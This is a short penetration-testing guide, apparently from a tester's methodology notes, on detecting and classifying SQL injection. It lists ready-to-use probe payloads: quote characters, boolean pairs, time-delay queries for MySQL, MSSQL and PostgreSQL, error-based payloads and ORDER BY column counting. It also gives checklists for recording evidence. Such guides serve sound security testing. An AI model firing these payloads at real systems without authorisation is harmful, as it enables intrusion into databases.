# SQL Injection Detection and Validation

## Goals
- Confirm injection points with low-impact tests
- Identify injection type and DBMS safely
- Minimize disruption to target application

## Step-by-Step Detection Process

### Step 1: Single Character Probes
Inject one character at a time into each parameter:
```
'    "    \    `    ;    )    ))    '-- -
```
Compare response to baseline (no injection). Look for:
- HTTP status code change (200 → 500)
- Response body length change (±significant)
- Error messages appearing
- Response time increase
- Redirect behavior change

### Step 2: Boolean Pair Testing
Send true/false condition pairs:
```sql
-- Numeric context
AND 1=1    vs    AND 1=2

-- String context
' AND '1'='1    vs    ' AND '1'='2

-- With termination
' AND 1=1-- -    vs    ' AND 1=2-- -
```
**Confirmation:** Different responses for true vs false = boolean-based injection.

### Step 3: Time-Based Confirmation
```sql
' AND SLEEP(3)-- -              (MySQL)
'; WAITFOR DELAY '0:0:3'-- -   (MSSQL)
' AND 1=(SELECT 1 FROM pg_sleep(3))-- -  (PostgreSQL)
```
**Confirmation:** Consistent 3-second delay = time-based blind injection.

### Step 4: Error-Based Confirmation
```sql
' AND 1=CONVERT(int,'a')-- -       (MSSQL)
' AND extractvalue(1,concat(0x7e,version()))-- -  (MySQL)
```
**Confirmation:** Database error with version/type info = error-based injection.

### Step 5: UNION Column Counting
```sql
' ORDER BY 1-- -    (no error)
' ORDER BY 5-- -    (no error)
' ORDER BY 10-- -   (error → columns < 10)
-- Binary search to find exact column count
```

## Indicators to Record
- Parameter name and HTTP method (GET/POST/Header)
- Injection type (boolean, error, union, time, OOB)
- DBMS fingerprint hints from errors
- Baseline response vs injected response (length, status, time)
- Exact payloads that triggered different behavior

## Evidence Checklist
- [ ] Request/response pairs (before and after injection)
- [ ] Injection confirmation note with type classification
- [ ] DBMS identification evidence
- [ ] Screenshot of error message or response difference
